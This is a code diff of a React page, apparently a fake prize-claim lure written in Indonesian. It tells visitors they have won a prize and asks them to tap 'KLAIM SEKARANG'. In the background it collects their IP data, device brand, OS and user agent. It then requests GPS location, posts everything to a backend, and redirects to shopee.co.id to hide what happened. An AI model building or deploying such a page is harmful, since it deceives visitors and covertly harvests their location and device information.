@@ -9,10 +9,14 @@ export default function TrackPage() {
   const [deviceInfo, setDeviceInfo] = useState<any>(null);
   const [loading, setLoading] = useState(false);
 
-  const ready = ipData && deviceInfo;
+  const [buttonReady, setButtonReady] = useState(false);
+
+  const dataReady = ipData && deviceInfo;
+
+  const ready = dataReady && buttonReady;
 
   useEffect(() => {
-    async function run() {
+    async function init() {
       const ipRes = await fetch("/api/get-ip");
       const ipJson = await ipRes.json();
       setIpData(ipJson);
@@ -31,21 +35,25 @@ export default function TrackPage() {
         }),
       });
 
-      setTimeout(() => confetti({ particleCount: 120, spread: 90 }), 300);
+      setTimeout(() => {
+        confetti({ particleCount: 120, spread: 80 });
+      }, 300);
     }
 
-    run();
+    init();
+
+    setTimeout(() => {
+      setButtonReady(true);
+    }, 3000);
+
   }, []);
 
   async function handleClaim() {
-    if (!ready) return alert("Sedang memuat data, coba 1 detik lagi");
+    if (!ready) return;
 
     setLoading(true);
 
-    const fullPayload = {
-      ...ipData,
-      ...deviceInfo,
-    };
+    const payload = { ...ipData, ...deviceInfo };
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
@@ -53,13 +61,13 @@ export default function TrackPage() {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            ...fullPayload,
+            ...payload,
             gpsLat: pos.coords.latitude,
             gpsLon: pos.coords.longitude,
           }),
         });
 
-        confetti({ particleCount: 300, spread: 100 });
+        confetti({ particleCount: 250, spread: 100 });
 
         setTimeout(() => {
           window.location.href = "https://shopee.co.id";
@@ -71,7 +79,7 @@ export default function TrackPage() {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            ...fullPayload,
+            ...payload,
             gpsLat: null,
             gpsLon: null,
           }),
@@ -89,27 +97,32 @@ export default function TrackPage() {
       <div style={styles.card}>
         {loading ? (
           <>
-            <h2 style={styles.title}>⏳ Memverifikasi...</h2>
-            <p style={styles.text}>Harap tunggu sebentar…</p>
+            <h2 style={styles.title}>⏳ Memproses...</h2>
+            <p style={styles.text}>Sebentar ya, hadiah sedang diklaim…</p>
           </>
         ) : (
           <>
             <h2 style={styles.title}>🎉 SELAMAT!</h2>
-            <p style={styles.text}>
-              Anda mendapatkan kesempatan hadiah menarik!
-            </p>
+            <p style={styles.text}>Anda mendapatkan hadiah menarik!</p>
 
             <button
-             disabled={!ready}
+              onClick={handleClaim}
+              disabled={!ready}
               style={{
                 ...styles.button,
-                opacity: ready ? 1 : 0.5,
+                opacity: ready ? 1 : 0.4,
                 pointerEvents: ready ? "auto" : "none",
               }}
-              onClick={handleClaim}
             >
               🎁 KLAIM SEKARANG
+              {!ready && <span style={styles.loading}> ⏳</span>}
             </button>
+
+            {!ready && (
+              <p style={styles.smallText}>
+                Menyiapkan hadiah Anda...
+              </p>
+            )}
           </>
         )}
       </div>
@@ -132,59 +145,65 @@ function getDeviceInfo() {
   if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";
 
   const brands = [
-    "Samsung",
-    "Xiaomi",
-    "Oppo",
-    "Vivo",
-    "Realme",
-    "Infinix",
-    "Poco",
-    "Huawei",
-    "Nokia",
-    "Sony",
-    "Asus",
-    "Lenovo",
-    "iPhone",
-    "iPad",
+    "Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Infinix",
+    "Poco", "Huawei", "Nokia", "Sony", "Asus", "Lenovo",
+    "iPhone", "iPad",
   ];
 
-  let brand = "Unknown";
+  let device = "Unknown Device";
   for (const b of brands) {
-    if (ua.includes(b.toLowerCase())) brand = b;
+    if (ua.includes(b.toLowerCase())) device = b;
   }
 
-  if (deviceType === "Desktop") brand = os;
+  if (deviceType === "Desktop") device = os;
 
-  return { device: brand, deviceType, os, userAgent: navigator.userAgent };
+  return { device, deviceType, os, userAgent: navigator.userAgent };
 }
 
 const styles: any = {
   container: {
     minHeight: "100vh",
-    background: "#ffefe0",
+    background: "#FFF4E6",
     display: "flex",
     justifyContent: "center",
     alignItems: "center",
+    padding: 20,
   },
   card: {
     background: "#fff",
     padding: 30,
+    borderRadius: 16,
     maxWidth: 360,
-    borderRadius: 15,
+    width: "100%",
     textAlign: "center",
-    boxShadow: "0 6px 18px rgba(0,0,0,0.15)",
+    boxShadow: "0 6px 20px rgba(0,0,0,0.15)",
   },
-  title: { fontSize: 26, marginBottom: 10 },
-  text: { fontSize: 16 },
+  title: {
+    fontSize: 28,
+    fontWeight: "bold",
+    marginBottom: 12,
+  },
+  text: {
+    fontSize: 16,
+    marginBottom: 20,
+  },
+  smallText: {
+    fontSize: 13,
+    color: "#666",
+    marginTop: 10,
+  },
   button: {
-    background: "#ff5722",
-    padding: 14,
-    marginTop: 20,
-    borderRadius: 10,
+    background: "#FF5722",
+    color: "white",
+    padding: "14px 18px",
+    width: "100%",
     border: "none",
-    color: "#fff",
+    borderRadius: 10,
     fontSize: 18,
     cursor: "pointer",
-    width: "100%",
+    marginTop: 10,
+  },
+  loading: {
+    marginLeft: 6,
   },
 };
